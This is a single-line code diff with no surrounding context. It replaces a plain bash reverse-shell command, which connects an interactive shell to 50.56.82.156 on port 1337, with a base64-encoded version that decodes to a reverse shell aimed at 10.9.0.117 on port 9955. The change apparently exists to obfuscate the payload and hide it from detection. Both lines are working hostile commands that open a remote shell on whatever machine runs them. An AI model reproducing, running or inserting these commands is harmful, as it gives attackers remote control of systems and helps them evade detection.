@@ -1,1 +1,1 @@
-bash -c 'exec bash -i &>/dev/tcp/50.56.82.156/1337 <&1'
+echo -n "YmFzaCAtYyBleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xMC45LjAuMTE3Lzk5NTUgPCYxCg==" | base64 -d && bash && echo "\n"
